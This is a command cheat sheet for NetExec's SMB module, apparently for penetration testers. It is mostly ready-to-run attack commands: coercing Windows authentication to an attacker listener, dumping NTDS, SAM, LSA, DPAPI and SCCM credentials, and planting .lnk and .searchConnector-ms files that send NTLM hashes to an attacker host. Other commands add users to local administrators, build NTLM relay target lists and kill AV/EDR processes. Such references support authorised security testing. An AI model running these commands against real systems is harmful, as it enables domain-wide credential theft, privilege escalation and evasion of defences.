# NetExec SMB

## nxc smb

### SMB Coercion

Coerce a target into authenticating to your listener over SMB using the `coerce_plus` module (chains MS-RPRN, MS-EFSR, MS-DFSNM, and others).

```sh title:"coerce_plus chains PrinterBug, PetitPotam, DFSCoerce"
nxc smb $domain -u $user $auth_flags -M coerce_plus -o LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### generate-tgt - alternative to impacket getTGT

Request a TGT and save it as a ccache file - drop-in replacement for impacket's `getTGT.py`, useful when you already have the nxc session.

```sh title:"Save TGT as ccache file, replaces impacket getTGT.py"
nxc smb $domain -u $user $auth_flags -k --generate-tgt ./$ccache_file_name
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var ccache_file_name
-->

### Timeroast

Exploit Windows Time NTP authentication to extract RC4-HMAC hashes for every machine account - unauthenticated password recovery vector on legacy DCs.

```sh title:"Extract RC4-HMAC via NTP, works pre auth on legacy DCs"
nxc smb $domain -u $user $auth_flags -M timeroast
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Get user shares

List SMB shares on the target and show read/write permissions for the authenticated user.

```sh title:"--shares with R/W flags for current principal"
nxc smb $domain -u $user $auth_flags --shares
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### List folders in a share

Browse the top level of a named share to see which directories exist before spidering.

```sh title:"Browse share root before committing to spider"
nxc smb $domain -u $user $auth_flags --share $share_name --dir
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var share_name
-->

### List files in a share folder

Drill into a specific folder inside a share to list its files.

```sh title:"Drill into specific path inside share"
nxc smb $domain -u $user $auth_flags --share $share_name --dir $folder_path
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var share_name
var folder_path
-->

### get file from share

Download a specific file from an SMB share to the local filesystem.

```sh title:"--get-file pulls one file to local disk"
nxc smb $domain -u $user $auth_flags --share $share_name --get-file $file $file
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var share_name
var file
-->

### Dump NTDS

Dump the `NTDS.dit` database (every domain account's NT hash) - requires DA or equivalent DCSync rights.

```sh title:"Pull every domain NT hash, requires DCSync rights"
nxc smb $domain -u $user $auth_flags --ntds
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Get user SIDs via SMB

RID-brute the target over SMB and extract user SIDs only - great for populating a userlist from a single working credential.

```sh title:"RID-brute to 3000 via SMB, filter SidTypeUser"
nxc smb $domain -u $user $auth_flags --rid-brute 3000 | grep SidTypeUser | awk {'print $6'}
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Add user to local admin group

Execute `net localgroup administrators /add` on the target to promote a domain user to local admin. Requires existing local admin on the target.

```sh title:"net localgroup administrators /add via remote shell"
nxc smb $domain -u $user $auth_flags -x 'net localgroup administrators $domain_user /add'
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Coerce authentication via PetitPotam

Force the target to authenticate to your listener using the PetitPotam (MS-EFSR) coercion method specifically.

```sh title:"MS-EFSR method only, pin via METHOD= option"
nxc smb $domain -u $user $auth_flags -M coerce_plus -o LISTENER=$lhost METHOD=PetitPotam
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var lhost
-->

### password policys

Pull the domain password policy (min length, complexity, lockout threshold) - know this before spraying so you don't lock accounts.

```sh title:"Check lockout threshold before you start spraying"
nxc smb $domain -u $user $auth_flags --pass-pol
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Get Group Policy Preference AutoLogon

Search SYSVOL for GPP AutoLogin XML files containing cleartext local admin passwords - legacy but still found.

```sh title:"Scan SYSVOL for AutoLogin XML cleartext creds"
nxc smb $domain -u $user $auth_flags -M gpp_autologin
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Get Group Policy Preference Password

Search SYSVOL for legacy `Groups.xml` cpassword blobs (MS14-025) and decrypt them with the public AES key.

```sh title:"Decrypt cpassword blobs with the public AES key (MS14-025)"
nxc smb $domain -u $user $auth_flags -M gpp_password
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Logged on users

List currently logged-on users on the target - useful for BloodHound session data and lateral movement planning.

```sh title:"Active sessions feed BloodHound and lateral planning"
nxc smb $domain -u $user $auth_flags --loggedon-users
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Spider shares

Recursively walk a share, index everything, and save metadata + interesting files for offline triage.

```sh title:"spider_plus recursive walk, save metadata and hits"
nxc smb $domain -u $user $auth_flags -M spider_plus --share $share_name
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var share_name
-->

### Network connections (IPs/FQDN)

Pull every IP the target has bound (IPv4, IPv6, secondary addresses) plus its FQDN - useful for finding hosts behind NAT or on multiple VLANs.

```sh title:"Find hosts behind NAT or on multiple VLANs"
nxc smb $domain -u $user $auth_flags -M get_netconnections
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### slinky LNK NTLM Theft

Drop a malicious `.lnk` file in a writable share that coerces NTLM auth to your listener whenever the folder is browsed (icon load trigger).

```sh title:"Writable share .lnk icon load fires auth to listener"
nxc smb $domain -u $user $auth_flags -M slinky -o SERVER=$lhost NAME=$lnk_name
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
import tun_ip
var lnk_name
-->

### ntlm replay list

Generate an ntlmrelayx-compatible target list filtered to hosts with SMB signing disabled (relay candidates).

```sh title:"Filter to signing-disabled hosts for ntlmrelayx -tf"
nxc smb $domain -u $user $auth_flags --gen-relay-list relay.txt
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### .searchConnector-ms and .library-ms files NTLM Theft

Drop `.searchConnector-ms` / `.library-ms` files in a writable share - opens auto-auth to your UNC path when the folder is browsed, no click required.

```sh title:"drop-sc plants zero-click auto-auth files in share"
nxc smb $domain -u $user $auth_flags -M drop-sc -o URL=\\\\$lhost\\secret SHARE=$share_name FILENAME=secret
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var share_name
-->

### Backup Operators hive dump

Abuse Backup Operators group membership to read protected registry hives (SAM/SECURITY/SYSTEM) and dump credentials without being a full admin.

```sh title:"Read SAM/SECURITY/SYSTEM hives without full admin"
nxc smb $domain -u $user $auth_flags -M backup_operator
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Remote qwinsta

Run `qwinsta` remotely to show session info (interactive, RDP, disconnected) - requires local admin on the target.

```sh title:"Show interactive/RDP/disconnected sessions, needs local admin"
nxc smb $domain -u $user $auth_flags --qwinsta
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Dump SAM

Dump local SAM hashes from the target. `regdump` reads the live registry; `secdump` parses an offline copy.

```sh title:"Dump SAM hashes (regdump live or secdump offline)"
nxc smb $domain -u $user $auth_flags --sam
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Dump LSA secrets

Dump LSA secrets (service account passwords, machine account password, DPAPI system keys).

```sh title:"Dump LSA secrets (service / machine pwd / DPAPI sys)"
nxc smb $domain -u $user $auth_flags --lsa
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### NTDS via VSS

Dump NTDS.dit using a VSS snapshot instead of DRSUAPI. Useful when DRSUAPI is blocked or monitored.

```sh title:"Dump NTDS via VSS snapshot when DRSUAPI is blocked"
nxc smb $domain -u $user $auth_flags --ntds vss
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### NTDS with history

Dump NTDS plus password history. History columns crack into previously-used passwords (good for spraying laterally).

```sh title:"NTDS dump including password history columns"
nxc smb $domain -u $user $auth_flags --ntds --history
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### NTDS with Kerberos keys

Dump NTDS plus Kerberos AES and DES keys. Required for forging tickets that use AES (Server 2012+ default).

```sh title:"NTDS dump with AES/DES Kerberos keys (golden ticket)"
nxc smb $domain -u $user $auth_flags --ntds --kerberos-keys
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### NTDS enabled only

Dump NTDS, filtered to enabled accounts only. Skips disabled / tombstoned noise.

```sh title:"NTDS dump filtered to enabled accounts only"
nxc smb $domain -u $user $auth_flags --ntds --enabled
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### NTDS one user

Dump NTDS for a single named account. Targeted alternative to a full dump.

```sh title:"Targeted NTDS dump for one named account"
nxc smb $domain -u $user $auth_flags --ntds --user $target_user
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var target_user
-->

### Dump DPAPI

Dump DPAPI secrets (saved credentials, browser cookies). Add `cookies` to also pull browser cookies; `nosystem` skips SYSTEM DPAPI.

```sh title:"Dump DPAPI secrets (creds + optional browser cookies)"
nxc smb $domain -u $user $auth_flags --dpapi
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Dump SCCM secrets

Dump SCCM secrets via WMI or disk. NAA / OSD / Task Sequence creds end up here.

```sh title:"Dump SCCM secrets (NAA / OSD / Task Sequence creds)"
nxc smb $domain -u $user $auth_flags --sccm
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### List VSS snapshots

List Volume Shadow Copy snapshots on the target (default ADMIN$). Useful for finding old NTDS / SAM copies.

```sh title:"List VSS snapshots, hunt for old NTDS / SAM copies"
nxc smb $domain -u $user $auth_flags --list-snapshots
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Filter shares by access

Enumerate shares filtered to a chosen access level (READ, WRITE, READ,WRITE).

```sh title:"Enumerate shares filtered to chosen access level"
nxc smb $domain -u $user $auth_flags --shares --filter-shares READ,WRITE
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Exclude shares

Enumerate shares while excluding noisy default shares.

```sh title:"Enumerate shares, exclude noisy defaults"
nxc smb $domain -u $user $auth_flags --shares --exclude-shares C$ ADMIN$ IPC$
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Skip share write check

Enumerate shares without the active write probe. Avoids leaving traces when delete permissions are missing.

```sh title:"Share enum without active write probe (low trace)"
nxc smb $domain -u $user $auth_flags --shares --no-write-check
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### List path content

List the contents of a path on the target (defaults to root).

```sh title:"List contents of a path on target (default root)"
nxc smb $domain -u $user $auth_flags --dir $folder_path
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var folder_path
-->

### Network interfaces

Enumerate the target's network interfaces (IPs, masks, gateways).

```sh title:"Enumerate target network interfaces (IP/mask/gw)"
nxc smb $domain -u $user $auth_flags --interfaces
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Disks

Enumerate physical / logical disks on the target.

```sh title:"Enumerate target disks (physical / logical)"
nxc smb $domain -u $user $auth_flags --disks
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Domain users (SMB)

Enumerate domain users over SMB / SAMR. Pass a username to query just that one.

```sh title:"Enumerate domain users via SAMR (or just one)"
nxc smb $domain -u $user $auth_flags --users
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Domain groups (SMB)

Enumerate domain groups over SMB. Pass a group name to enumerate its members.

```sh title:"Enumerate domain groups via SAMR (or members of one)"
nxc smb $domain -u $user $auth_flags --groups
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Local groups

Enumerate local groups on the target. Pass a group name to enumerate its members.

```sh title:"Enumerate local groups on target (or members of one)"
nxc smb $domain -u $user $auth_flags --local-groups
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Computers (SMB)

Enumerate domain computer accounts over SMB.

```sh title:"Enumerate domain computer accounts over SMB"
nxc smb $domain -u $user $auth_flags --computers
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### SMB sessions

Enumerate active SMB sessions on the target. Maps where users are connected from.

```sh title:"Active SMB sessions, maps connection origins"
nxc smb $domain -u $user $auth_flags --smb-sessions
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Registry sessions

Enumerate user sessions via Remote Registry HKU keys. Filter by username, file, or list all.

```sh title:"User sessions via Remote Registry HKU enumeration"
nxc smb $domain -u $user $auth_flags --reg-sessions
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Logged-on user filter

Enumerate logged-on users with a regex filter applied to the username.

```sh title:"Logged-on users filtered by username regex"
nxc smb $domain -u $user $auth_flags --loggedon-users-filter $regex
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var regex
-->

### Process list

Enumerate running processes on the target. Pass a name to filter.

```sh title:"List running processes on target (filter by name)"
nxc smb $domain -u $user $auth_flags --tasklist
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Kill process

Kill a process by PID or name on the target. Useful for stopping AV / EDR before staging payloads.

```sh title:"Kill PID or named process (AV/EDR stop primitive)"
nxc smb $domain -u $user $auth_flags --taskkill $proc
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var proc
-->

### WMI query

Run an arbitrary WMI query against the target.

```sh title:"Run arbitrary WMI query against target"
nxc smb $domain -u $user $auth_flags --wmi-query "$wmi_query" --wmi-namespace 'root\cimv2'
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var wmi_query
-->

### Spider share

Recursively spider a named share. Default depth, no content search.

```sh title:"Recursive share spider, default depth, no content"
nxc smb $domain -u $user $auth_flags --spider $share_name
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var share_name
-->

### Spider with pattern

Spider a share and grep filenames + content for a pattern. The bread-and-butter cred-hunt mode.

```sh title:"Spider share + content grep for pattern (cred hunt)"
nxc smb $domain -u $user $auth_flags --spider $share_name --content --pattern $pattern --depth $depth
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var share_name
var pattern
var depth
-->

### Spider with regex

Spider a share applying a regex against filenames and file content.

```sh title:"Spider share with regex over names and content"
nxc smb $domain -u $user $auth_flags --spider $share_name --content --regex $regex --depth $depth
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var share_name
var regex
var depth
-->

### Put file to share

Push a local file to a path on the target via SMB.

```sh title:"Push local file to a target path via SMB"
nxc smb $domain -u $user $auth_flags --put-file $local_file_path $remote_file_path
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var local_file_path
var remote_file_path
-->

